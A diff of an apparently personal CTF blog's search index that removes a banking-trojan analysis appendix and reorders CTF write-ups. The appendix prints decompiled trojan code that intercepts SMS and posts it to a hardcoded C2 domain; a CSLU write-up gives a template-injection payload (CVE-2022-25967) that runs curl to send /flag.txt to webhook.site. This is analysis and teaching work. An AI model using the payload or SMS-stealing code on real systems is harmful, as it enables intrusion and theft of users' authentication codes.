@@ -1,87 +1,15 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Technical Appendix for APK</title>
-    <url>/2025/05/11/Analysis-of-Malware-APK-Appendix/</url>
-    <content><![CDATA[Technical Appendix: Decompiled Code AnalysisThis document provides a detailed technical analysis of the decompiled code components from the malicious Android banking trojan (maybank2u.apk). The analysis reveals sophisticated mechanisms for SMS interception, data obfuscation, and C2 communication.
-1. Main Entry Point (MainActivity.java)The MainActivity class serves as the primary entry point for the malware, implementing several key initialization routines:
-package m.m.ml;import android.app.AlertDialog;import android.content.Intent;import android.content.res.Resources;import android.os.Build;import android.os.Bundle;import android.os.Parcelable;import android.view.View;import android.view.Window;import androidx.activity.ComponentActivity;import defpackage.A0;import defpackage.AbstractC0137Rb;import defpackage.AbstractC0641jk;import defpackage.AbstractC0680ke;import defpackage.Am;import defpackage.An;import defpackage.Bn;import defpackage.C0570i0;import defpackage.C0574i4;import defpackage.C0683kh;import defpackage.C0808nF;import defpackage.C1298yB;import defpackage.C1332z0;import defpackage.Dm;import defpackage.Dw;import defpackage.Hm;import defpackage.L8;import defpackage.N8;import defpackage.O8;import defpackage.RF;import defpackage.T8;import defpackage.X9;import java.util.ArrayList;import java.util.Iterator;import java.util.LinkedHashMap;import java.util.Locale;import java.util.NoSuchElementException;import java.util.Objects;/* Decompiled from classes.dex */public final class MainActivity extends ComponentActivity &#123;    public static final /* synthetic */ int w = 0;        @Override    public final void onCreate(Bundle bundle) &#123;        AbstractC0137Rb abstractC0137Rb;        int hashCode;        int hashCode2;        int i = 0;        int i2 = AbstractC0680ke.a;        Dw dw = Dw.I;        C1298yB c1298yB = new C1298yB(0, 0, dw);        C1298yB c1298yB2 = new C1298yB(AbstractC0680ke.a, AbstractC0680ke.b, dw);        View decorView = getWindow().getDecorView();        AbstractC0641jk.u(decorView, &quot;window.decorView&quot;);        Resources resources = decorView.getResources();        AbstractC0641jk.u(resources, &quot;view.resources&quot;);        boolean booleanValue = ((Boolean) dw.j(resources)).booleanValue();        Resources resources2 = decorView.getResources();        AbstractC0641jk.u(resources2, &quot;view.resources&quot;);        boolean booleanValue2 = ((Boolean) dw.j(resources2)).booleanValue();        int i3 = Build.VERSION.SDK_INT;        if (i3 &gt;= 30) &#123;            abstractC0137Rb = new Object();        &#125; else if (i3 &gt;= 29) &#123;            abstractC0137Rb = new Object();        &#125; else if (i3 &gt;= 28) &#123;            abstractC0137Rb = new Object();        &#125; else if (i3 &gt;= 26) &#123;            abstractC0137Rb = new Object();        &#125; else &#123;            abstractC0137Rb = new Object();        &#125;        Window window = getWindow();        AbstractC0641jk.u(window, &quot;window&quot;);        abstractC0137Rb.V(c1298yB, c1298yB2, window, decorView, booleanValue, booleanValue2);        Window window2 = getWindow();        AbstractC0641jk.u(window2, &quot;window&quot;);        abstractC0137Rb.o(window2);        super.onCreate(bundle);        final C0808nF c0808nF = new C0808nF(5);        final C0570i0 c0570i0 = new C0570i0(this);        final L8 l8 = this.l;        AbstractC0641jk.v(l8, &quot;registry&quot;);        final String str = &quot;activity_rq#&quot; + this.k.getAndIncrement();        AbstractC0641jk.v(str, &quot;key&quot;);        Hm hm = this.Tj0TVE0Hb5c3ac3785e6455cb344fca21faf691b;        if (hm.c.compareTo(Am.g) &lt; 0) &#123;            LinkedHashMap linkedHashMap = l8.b;            int i4 = 1;            if (((Integer) linkedHashMap.get(str)) == null) &#123;                Iterator it = new X9(new C0683kh(A0.f, new RF(i4, 9))).iterator();                while (it.hasNext()) &#123;                    Number number = (Number) it.next();                    int intValue = number.intValue();                    LinkedHashMap linkedHashMap2 = l8.a;                    if (!linkedHashMap2.containsKey(Integer.valueOf(intValue))) &#123;                        int intValue2 = number.intValue();                        linkedHashMap2.put(Integer.valueOf(intValue2), str);                        linkedHashMap.put(str, Integer.valueOf(intValue2));                    &#125;                &#125;                throw new NoSuchElementException(&quot;Sequence contains no element matching the predicate.&quot;);            &#125;            LinkedHashMap linkedHashMap3 = l8.c;            C1332z0 c1332z0 = (C1332z0) linkedHashMap3.get(str);            if (c1332z0 == null) &#123;                c1332z0 = new C1332z0(hm);            &#125;            Dm dm = new Dm() &#123;                 // Inner class code omitted for brevity            &#125;;            c1332z0.a.a(dm);            c1332z0.b.add(dm);            linkedHashMap3.put(str, c1332z0);            C0574i4 c0574i4 = new C0574i4(l8, str, c0808nF);            if (getSharedPreferences(&quot;app_data_launch_f&quot;, 0).getBoolean(&quot;isFirstRun&quot;, true)) &#123;                AlertDialog.Builder builder = new AlertDialog.Builder(this);                String locale = Locale.getDefault().toString();                int hashCode3 = locale.hashCode();                String str2 = &quot;Ruxsatlar talab qilinadi&quot;;                if (hashCode3 != -139822896) &#123;                    if (hashCode3 != 108860863) &#123;                        if (hashCode3 == 111780381) &#123;                        &#125;                        str2 = &quot;Permissions required&quot;;                        builder.setTitle(str2);                        String locale2 = Locale.getDefault().toString();                        hashCode = locale2.hashCode();                        String str3 = &quot;Ilova ishlashi uchun telefonning asosiy funksiyalariga kirish tinglanadi.&quot;;                        if (hashCode != -139822896) &#123;                            if (hashCode != 108860863) &#123;                                if (hashCode == 111780381) &#123;                                &#125;                                str3 = &quot;For the application to work, access to the main functions of the phone is required.&quot;;                                builder.setMessage(str3);                                String locale3 = Locale.getDefault().toString();                                hashCode2 = locale3.hashCode();                                String str4 = &quot;Ruxsat berish&quot;;                                if (hashCode2 != -139822896) &#123;                                    if (hashCode2 != 108860863) &#123;                                        if (hashCode2 == 111780381) &#123;                                        &#125;                                        str4 = &quot;Allow&quot;;                                        builder.setPositiveButton(str4, new An(i, c0574i4));                                        builder.show();                                        N8.a(this, T8.Tj0TVE0Hb5c3ac3785e6455cb344fca21faf691b);                                    &#125; else &#123;                                        if (locale3.equals(&quot;ru_RU&quot;)) &#123;                                            str4 = &quot;Разрешить&quot;;                                            builder.setPositiveButton(str4, new An(i, c0574i4));                                            builder.show();                                            N8.a(this, T8.Tj0TVE0Hb5c3ac3785e6455cb344fca21faf691b);                                        &#125;                                        str4 = &quot;Allow&quot;;                                        builder.setPositiveButton(str4, new An(i, c0574i4));                                        builder.show();                                        N8.a(this, T8.Tj0TVE0Hb5c3ac3785e6455cb344fca21faf691b);                                    &#125;                                &#125;                            &#125; else &#123;                                if (locale2.equals(&quot;ru_RU&quot;)) &#123;                                    str3 = &quot;Для работы приложения трубуется доступ к основным функциям телефона.&quot;;                                    builder.setMessage(str3);                                    String locale32 = Locale.getDefault().toString();                                    hashCode2 = locale32.hashCode();                                    String str42 = &quot;Ruxsat berish&quot;;                                    if (hashCode2 != -139822896) &#123;                                    &#125;                                &#125;                                str3 = &quot;For the application to work, access to the main functions of the phone is required.&quot;;                                builder.setMessage(str3);                                String locale322 = Locale.getDefault().toString();                                hashCode2 = locale322.hashCode();                                String str422 = &quot;Ruxsat berish&quot;;                                if (hashCode2 != -139822896) &#123;                                &#125;                            &#125;                        &#125;                    &#125; else &#123;                        if (locale.equals(&quot;ru_RU&quot;)) &#123;                            str2 = &quot;Необходимы разрешения&quot;;                            builder.setTitle(str2);                            String locale22 = Locale.getDefault().toString();                            hashCode = locale22.hashCode();                            String str32 = &quot;Ilova ishlashi uchun telefonning asosiy funksiyalariga kirish tinglanadi.&quot;;                            if (hashCode != -139822896) &#123;                            &#125;                        &#125;                        str2 = &quot;Permissions required&quot;;                        builder.setTitle(str2);                        String locale222 = Locale.getDefault().toString();                        hashCode = locale222.hashCode();                        String str322 = &quot;Ilova ishlashi uchun telefonning asosiy funksiyalariga kirish tinglanadi.&quot;;                        if (hashCode != -139822896) &#123;                        &#125;                    &#125;                &#125;            &#125; else &#123;                N8.a(this, new O8(-425911099, new Bn(this, i), true));            &#125;            startService(new Intent(this, (Class&lt;?&gt;) MgRKn55kcebb482e4b514772964e31012d0b1157.class));            return;        &#125;        throw new IllegalStateException((&quot;LifecycleOwner &quot; + this + &quot; is attempting to register while current state is &quot; + hm.c + &quot;. LifecycleOwners must call register before they are STARTED.&quot;).toString());    &#125;&#125;
-
-Key Observations:
-Deceptive Permission Request: The malware presents a localized dialog to trick users into granting sensitive permissions, adapting to the device’s language settings
-Multi-language Support: Implements Russian and English localization to target a wider audience
-Persistence Mechanism: Starts a background service (MgRKn55kcebb482e4b514772964e31012d0b1157.class) for continuous operation
-Runtime Permissions: Uses modern Android permission request mechanisms to access sensitive data
-
-2. SMS Interception Component (RE.java)The RE class extends BroadcastReceiver to implement the core SMS interception functionality:
-public final class RE extends BroadcastReceiver &#123;    @Override    public final void onReceive(Context context, Intent intent) &#123;        // Permission validation        if (AbstractC0737lq.s(context, &quot;android.permission.RECEIVE_SMS&quot;) == 0 &amp;&amp;             AbstractC0737lq.s(context, &quot;android.permission.READ_SMS&quot;) == 0 &amp;&amp;             AbstractC0641jk.o(intent.getAction(), &quot;android.provider.Telephony.SMS_RECEIVED&quot;)) &#123;                        // Extract SMS content            SmsMessage[] messagesFromIntent = Telephony.Sms.Intents.getMessagesFromIntent(intent);                        // Process each message in the broadcast            for (SmsMessage smsMessage : messagesFromIntent) &#123;                String valueOf = String.valueOf(smsMessage.getTimestampMillis());                String originatingAddress = smsMessage.getOriginatingAddress();                String messageBody = smsMessage.getMessageBody();                // [...processing code...]            &#125;                        // Obfuscate the extracted data            String b = C0044Fe.b(str);    // Timestamp            String b2 = C0044Fe.b(str2);  // Sender            String b3 = C0044Fe.b(str3);  // Message content                        // Network connectivity check            // [...connectivity check code...]                        if (z) &#123; // If online                // Exfiltrate data immediately                new C0044Fe(context, 1).d(new JSONObject(&quot;&#123; \&quot;t\&quot;: \&quot;&quot; + b + &quot;\&quot;, \&quot;f\&quot;: \&quot;&quot; + b2 + &quot;\&quot;, \&quot;m\&quot;: \&quot;&quot; + b3 + &quot;\&quot; &#125;&quot;), false);                                // Also attempt to send any cached offline data                // [...cached data handling...]            &#125; else &#123;                // Store data locally for later exfiltration                HashSet hashSet2 = new HashSet(list);                hashSet2.add(jSONObject);                sharedPreferences.edit().putStringSet(&quot;data&quot;, hashSet2).apply();            &#125;        &#125;    &#125;&#125;
-
-Key Observations:
-Event Targeting: The malware specifically targets &quot;android.provider.Telephony.SMS_RECEIVED&quot; broadcasts
-Comprehensive Data Collection: Extracts timestamp, sender, and full message content from each SMS
-Resilient Operation: Implements offline storage when network connectivity is unavailable
-Smart Exfiltration: Attempts to send previously stored data when connectivity is restored
-
-3. Data Exfiltration Engine (C0044Fe.java)The C0044Fe class implements sophisticated data obfuscation and exfiltration capabilities:
-public final class C0044Fe implements InterfaceC0004Ae &#123;    public final Context a;        // [...initialization code...]        // Custom obfuscation algorithm    public static String b(String str) &#123;        AbstractC0641jk.v(str, &quot;input&quot;);        byte[] bytes = str.getBytes(AbstractC0755m7.a);        String encodeToString = Base64.encodeToString(bytes, 2);                // Character substitution cipher implementation        StringBuilder sb = new StringBuilder();        int length = encodeToString.length();        for (int i4 = 0; i4 &lt; length; i4++) &#123;            char charAt = encodeToString.charAt(i4);            // Complex character transposition logic            // [...character manipulation code...]            sb.append(charAt);        &#125;        return sb.toString();    &#125;        // Network connectivity check    public boolean c() &#123;        // [...connectivity code...]    &#125;        // Data transmission to C2    public void d(JSONObject jSONObject, boolean z) &#123;        String concat;                // Determine target endpoint based on operation type        if (z) &#123;            byte[] decode = Base64.decode(&quot;aHR0cHM6Ly93ZWVkb29tLm5ldA==&quot;, 0);            concat = new String(decode, AbstractC0755m7.a).concat(&quot;/minit&quot;);        &#125; else &#123;            byte[] decode2 = Base64.decode(&quot;aHR0cHM6Ly93ZWVkb29tLm5ldA==&quot;, 0);            concat = new String(decode2, AbstractC0755m7.a).concat(&quot;/multipush&quot;);        &#125;                try &#123;            // Prepare HTTP request            Gl gl = new Gl();            gl.m(concat);            gl.l(&quot;POST&quot;, AbstractC0597ik.s(z2, jSONObject2));                        // Add authentication token            byte[] decode3 = Base64.decode(&quot;QmV0YQ==&quot;, 0);            String b = b(new String(decode3, AbstractC0755m7.a));            c0236ai.a(&quot;auth&quot;, b);                        // Add device identifier            String string = Settings.Secure.getString(this.a.getContentResolver(), &quot;android_id&quot;);            String b2 = b(string);            c0236ai2.a(&quot;id&quot;, b2);                        // Execute request            new C0563hu(xp, gl.e()).e(new Yw(11));        &#125; catch (Exception unused) &#123;            // Silent error handling        &#125;    &#125;&#125;
-
-Key Observations:
-Multi-layer Obfuscation: Implements Base64 encoding followed by a custom character substitution cipher
-Embedded C2: Contains hardcoded Base64-encoded C2 domain (aHR0cHM6Ly93ZWVkb29tLm5ldA== &#x3D; https://weedoom.net)
-Dual Endpoint Strategy: Uses different endpoints for data exfiltration (/multipush) and initialization (/minit)
-Device Fingerprinting: Transmits unique Android device identifier with each request
-Silent Failure: Implements empty exception handler to prevent error notifications
-
-4. Obfuscation AnalysisThe malware employs a sophisticated custom character substitution cipher in the b() method:
-public static String b(String str) &#123;    // [...initial Base64 encoding...]        StringBuilder sb = new StringBuilder();    int length = encodeToString.length();    for (int i4 = 0; i4 &lt; length; i4++) &#123;        char charAt = encodeToString.charAt(i4);                // Lowercase Latin character transformation        if (Character.isLowerCase(charAt)) &#123;            i2 = 97;            if (&#x27;a&#x27; &lt;= charAt &amp;&amp; charAt &lt; &#x27;&#123;&#x27;) &#123;                i3 = (charAt - &#x27;Y&#x27;) % 26;                i = i3 + i2;                charAt = (char) i;                sb.append(charAt);            &#125;        &#125;                // Cyrillic character transformation        if (Character.isLowerCase(charAt) &amp;&amp; 1072 &lt;= charAt &amp;&amp; charAt &lt; 1104) &#123;            i = ((charAt - 1064) % 32) + 1072;        &#125; else &#123;            // Uppercase Latin character transformation            if (Character.isUpperCase(charAt)) &#123;                i2 = 65;                if (&#x27;A&#x27; &lt;= charAt &amp;&amp; charAt &lt; &#x27;[&#x27;) &#123;                    i3 = (charAt - &#x27;9&#x27;) % 26;                    i = i3 + i2;                &#125;            &#125;                        // Uppercase Cyrillic character transformation            if (Character.isUpperCase(charAt)) &#123;                i2 = 1040;                if (1040 &lt;= charAt &amp;&amp; charAt &lt; 1072) &#123;                    i3 = (charAt - 1032) % 32;                    i = i3 + i2;                &#125;            &#125;                        // Numeric character transformation            if (Character.isDigit(charAt)) &#123;                i = ((charAt - &#x27;(&#x27;) % 10) + 48;            &#125; else &#123;                sb.append(charAt);            &#125;        &#125;                charAt = (char) i;        sb.append(charAt);    &#125;        return sb.toString();&#125;
-
-Key Observations:
-Multi-alphabet Support: The cipher handles Latin, Cyrillic, and numeric characters differently
-Character Set Segregation: Different transformation algorithms for lowercase, uppercase, and digit characters
-Modular Arithmetic: Uses modulo operations to ensure character transformations remain within valid ranges
-Preservation of Special Characters: Non-alphanumeric characters remain unchanged
-
-5. Network Transport ImplementationThe malware implements sophisticated network connectivity detection to ensure reliable data exfiltration:
-// Get system connectivity serviceConnectivityManager connectivityManager = (ConnectivityManager) systemService;// Check active network capabilitiesNetworkCapabilities networkCapabilities = connectivityManager.getNetworkCapabilities(activeNetwork);// Verify available transport typesif (!networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) &amp;&amp;     // WiFi (1)    !networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) &amp;&amp; // Cellular (0)    !networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_VPN)) &#123;      // VPN (3)        z = false; // Flag as offline - no internet connectivity&#125;
-
-Key Observations:
-Comprehensive Connectivity Check: Tests multiple network transport types (WiFi, Cellular, VPN)
-Modern API Usage: Uses NetworkCapabilities rather than deprecated connectivity methods
-Transport Type Constants: References transport types by numeric constants:
-WiFi: NetworkCapabilities.TRANSPORT_WIFI (1)
-Cellular: NetworkCapabilities.TRANSPORT_CELLULAR (0)
-VPN: NetworkCapabilities.TRANSPORT_VPN (3)
-
-
-
-6. Data Storage SchemaThe malware implements resilient offline storage using Android’s SharedPreferences:
-// Initialize SharedPreferences for persistent storageSharedPreferences sharedPreferences = context.getSharedPreferences(&quot;db&quot;, 0);// Retrieve existing stored data or create new storageSet&lt;String&gt; stringSet = sharedPreferences.getStringSet(&quot;data&quot;, new HashSet());// Prepare new data for storageHashSet&lt;String&gt; hashSet2 = new HashSet&lt;&gt;(stringSet);hashSet2.add(jsonData.toString());// Commit updated data to persistent storagesharedPreferences.edit().putStringSet(&quot;data&quot;, hashSet2).apply();
-
-Key Observations:
-Database Name: Uses generic name &quot;db&quot; to avoid detection
-Storage Mode: Uses private mode (0) to prevent access by other applications
-Data Structure: Stores JSON strings in a HashSet under key &quot;data&quot;
-Asynchronous Storage: Uses apply() rather than commit() for non-blocking storage operations
-
-7. ConclusionThe decompiled code analysis reveals a sophisticated malware implementation with advanced techniques for:
-
-Permission Acquisition: Social engineering via localized dialogs
-SMS Interception: Efficient broadcast receiver implementation
-Data Obfuscation: Multi-layer encoding with custom cipher
-Network Resilience: Online&#x2F;offline operation with data caching
-Device Identification: Unique device fingerprinting for tracking
-Anti-Analysis: Heavy obfuscation of strings and control flow
-
-These findings corroborate the assessment that this malware represents a significant threat, specifically targeting financial authentication via SMS interception and implementing robust mechanisms for data exfiltration.
-]]></content>
+    <title>Bronco CTF 2025</title>
+    <url>/2025/02/17/Bronco-CTF-2025/</url>
+    <content><![CDATA[Web]]></content>
       <categories>
-        <category>Malware Analysis</category>
+        <category>CTF 2025</category>
       </categories>
       <tags>
-        <tag>Malware Analysis</tag>
-        <tag>Android Security</tag>
-        <tag>Mobile Threats</tag>
-        <tag>Banking Trojan</tag>
+        <tag>Forensics</tag>
+        <tag>Web</tag>
       </tags>
   </entry>
   <entry>
@@ -469,145 +397,6 @@ These findings corroborate the assessment that this malware represents a signifi
       </tags>
   </entry>
   <entry>
-    <title>Bronco CTF 2025</title>
-    <url>/2025/02/17/Bronco-CTF-2025/</url>
-    <content><![CDATA[Web]]></content>
-      <categories>
-        <category>CTF 2025</category>
-      </categories>
-      <tags>
-        <tag>Forensics</tag>
-        <tag>Web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CSLU 2024 UPM</title>
-    <url>/2024/12/31/CSLU-2024-UPM/</url>
-    <content><![CDATA[ForensicsDr. Mals
-
-Download the Dr. Mals word file
-Use Oletools - olevba to decrypt this file
-
-
-
-With the use of CyberChef, we can find out the encoded text
-
-
-
-Searching the website and it given
-
-
-
-Lets decode this
-With the use of online decoderwe can find out the flag
-
-
-
-Thats it.
-
-AcknowledgementThx to Akram for providing Hint
-RE:Memory Delete
-
-First, we download the attached file given by the challenge.
-Challenge.7z
-
-
-Unzip it.-Challenge.ad1 files inside.
-.ad1 is a image files so lets use FTK Imager to find the deleted file
-
-There goes the flag
-
-Skyfall
-Pain killer, My Skill issue… XD
-
-Download the file attach by the challenge.-capture.pcapng
-Use wireshark to open the pcapng files
-See the clue given, Love the EDITED LEWIS VERSION files and lost the flag.
-
-
-
-File -&gt; Export -&gt; Http, and save all the files.
-we can see there is 5 files exported, 2 text file with word File received successfully! and file_data=16ae9187d13259788a97aef16a7d50f8b6376fbcba92a0f53e7e68d9f562a3a6576a3183a8dc8631c64fbd9147c8b608
-usefull for later
-
-
-And there is a file with big data 24,345kb and let us see what file is that.
-
-
-
-
-
-Looks like it is a elf file  
-I manage to find a website to extract the elf file EzyZIP
-We can see the largest file is here after extract
-
-
-After have a long time searching, i cant found any ways to extract pydata… skill issue XD
-
-
-After the end of the day, my friend told me there is something call Pyinstxtractor that can extract it.
-
-This is what i found
-
-
-okayyyy here is it
-
-
-
-Theres alot files inside, but the one the name skyfall-lewis-edited-version.pyc is the most suspicious.
-
-
-
-With the use of this website Pylingual, i transfer pyc files to py
-
-
-
-We can see it is a AES encyption function and the key is the time which the user encrypt when downloaded, so lets go back to wireshark and find the date when she successfuly download.
-
-We can find out that the epoch for the time she download the file is 1733988750
-
-
-Then use GPT xd find the key out
-
-ps: I also dk why need to use 1733988749 just told by my friend to use it cant find any things that support this epoch XD.
-
-
-Okay, then let us go to decrypt it. Use cyberchef
-Heres the flag.Okay its maybe abit harder than i though. cry die.
-
-AcknowledgementThx to Bakayang for providing solution at the end of the day
-WEBUseless Website
-
-Download the source code of the website
-
-We can see theres something in the package.json file
-
-
-
-
-Searching on the internet CVE-2022-25967 showing that there is some leakage can be use on the eta framework.
-
-In burpsuite, intercept the web and change to this
-/utils/settings HTTP/1.1Host: 5.75.155.50:1341User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brConnection: keep-aliveContent-Type: application/jsonUpgrade-Insecure-Requests: 1If-None-Match: W/&quot;1057-ih1IUXlwncna8aHynJLYIHjiX30&quot;Priority: u=0, iContent-Length: 292&#123;  &quot;settings&quot;: &#123;    &quot;view options&quot;: &#123;      &quot;varName&quot;: &quot;x=process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;curl https://webhook.site/self id/$(cat /flag.txt)&#x27;)&quot;,      &quot;include&quot;: false,      &quot;includeFile&quot;: false,      &quot;useWith&quot;: true    &#125;  &#125;&#125;
-
-And we can find out the flag at the end of the webhook link.
-
-
-CSLU&#123;wh4ts_y0ur_et4?&#125;
-
-
-
-AcknowledgementThx for Megat for the solution.
-]]></content>
-      <categories>
-        <category>CTF 2024</category>
-      </categories>
-      <tags>
-        <tag>Forensics</tag>
-        <tag>Web</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CyberX Internal CTF 2024</title>
     <url>/2024/12/31/CyberX-Internal-CTF-2024/</url>
     <content><![CDATA[ForensicsForensic Odyssey 1: A Message in the Mist
@@ -830,6 +619,139 @@ There you go the flag!!
       </tags>
   </entry>
   <entry>
+    <title>Readme</title>
+    <url>/2024/12/31/Readme/</url>
+    <content><![CDATA[This is my First Post in my Website!!There will be Writeup for my CTF Challenge and maybe some Learning stuff I Guess???
+]]></content>
+  </entry>
+  <entry>
+    <title>CSLU 2024 UPM</title>
+    <url>/2024/12/31/CSLU-2024-UPM/</url>
+    <content><![CDATA[ForensicsDr. Mals
+
+Download the Dr. Mals word file
+Use Oletools - olevba to decrypt this file
+
+
+
+With the use of CyberChef, we can find out the encoded text
+
+
+
+Searching the website and it given
+
+
+
+Lets decode this
+With the use of online decoderwe can find out the flag
+
+
+
+Thats it.
+
+AcknowledgementThx to Akram for providing Hint
+RE:Memory Delete
+
+First, we download the attached file given by the challenge.
+Challenge.7z
+
+
+Unzip it.-Challenge.ad1 files inside.
+.ad1 is a image files so lets use FTK Imager to find the deleted file
+
+There goes the flag
+
+Skyfall
+Pain killer, My Skill issue… XD
+
+Download the file attach by the challenge.-capture.pcapng
+Use wireshark to open the pcapng files
+See the clue given, Love the EDITED LEWIS VERSION files and lost the flag.
+
+
+
+File -&gt; Export -&gt; Http, and save all the files.
+we can see there is 5 files exported, 2 text file with word File received successfully! and file_data=16ae9187d13259788a97aef16a7d50f8b6376fbcba92a0f53e7e68d9f562a3a6576a3183a8dc8631c64fbd9147c8b608
+usefull for later
+
+
+And there is a file with big data 24,345kb and let us see what file is that.
+
+
+
+
+
+Looks like it is a elf file  
+I manage to find a website to extract the elf file EzyZIP
+We can see the largest file is here after extract
+
+
+After have a long time searching, i cant found any ways to extract pydata… skill issue XD
+
+
+After the end of the day, my friend told me there is something call Pyinstxtractor that can extract it.
+
+This is what i found
+
+
+okayyyy here is it
+
+
+
+Theres alot files inside, but the one the name skyfall-lewis-edited-version.pyc is the most suspicious.
+
+
+
+With the use of this website Pylingual, i transfer pyc files to py
+
+
+
+We can see it is a AES encyption function and the key is the time which the user encrypt when downloaded, so lets go back to wireshark and find the date when she successfuly download.
+
+We can find out that the epoch for the time she download the file is 1733988750
+
+
+Then use GPT xd find the key out
+
+ps: I also dk why need to use 1733988749 just told by my friend to use it cant find any things that support this epoch XD.
+
+
+Okay, then let us go to decrypt it. Use cyberchef
+Heres the flag.Okay its maybe abit harder than i though. cry die.
+
+AcknowledgementThx to Bakayang for providing solution at the end of the day
+WEBUseless Website
+
+Download the source code of the website
+
+We can see theres something in the package.json file
+
+
+
+
+Searching on the internet CVE-2022-25967 showing that there is some leakage can be use on the eta framework.
+
+In burpsuite, intercept the web and change to this
+/utils/settings HTTP/1.1Host: 5.75.155.50:1341User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brConnection: keep-aliveContent-Type: application/jsonUpgrade-Insecure-Requests: 1If-None-Match: W/&quot;1057-ih1IUXlwncna8aHynJLYIHjiX30&quot;Priority: u=0, iContent-Length: 292&#123;  &quot;settings&quot;: &#123;    &quot;view options&quot;: &#123;      &quot;varName&quot;: &quot;x=process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;curl https://webhook.site/self id/$(cat /flag.txt)&#x27;)&quot;,      &quot;include&quot;: false,      &quot;includeFile&quot;: false,      &quot;useWith&quot;: true    &#125;  &#125;&#125;
+
+And we can find out the flag at the end of the webhook link.
+
+
+CSLU&#123;wh4ts_y0ur_et4?&#125;
+
+
+
+AcknowledgementThx for Megat for the solution.
+]]></content>
+      <categories>
+        <category>CTF 2024</category>
+      </categories>
+      <tags>
+        <tag>Forensics</tag>
+        <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>EQFCTF 2025</title>
     <url>/2025/01/18/EQFCTF-2025/</url>
     <content><![CDATA[MiscJoin Our Discord
@@ -909,20 +831,6 @@ And thats the flag EQCTF{Int3RcEpT_da_Tr3FfiC}”
       </tags>
   </entry>
   <entry>
-    <title>PICO CTF 2025</title>
-    <url>/2025/03/08/PICO-CTF/</url>
-    <content><![CDATA[[Forensics]]]></content>
-      <tags>
-        <tag>CTF 2025</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Readme</title>
-    <url>/2024/12/31/Readme/</url>
-    <content><![CDATA[This is my First Post in my Website!!There will be Writeup for my CTF Challenge and maybe some Learning stuff I Guess???
-]]></content>
-  </entry>
-  <entry>
     <title>UM CyberSummit 2025</title>
     <url>/2025/04/18/UM-CyberSummit-2025/</url>
     <content><![CDATA[🔗 Check Out Our Website👉 UMCS CTF Blog
@@ -955,5 +863,13 @@ Google search beco do batman burger restaurant shows some restaurant name but fi
 Flag &#x3D; THM{coringa_do_beco}
 
 ]]></content>
+  </entry>
+  <entry>
+    <title>PICO CTF 2025</title>
+    <url>/2025/03/08/PICO-CTF/</url>
+    <content><![CDATA[[Forensics]]]></content>
+      <tags>
+        <tag>CTF 2025</tag>
+      </tags>
   </entry>
 </search>
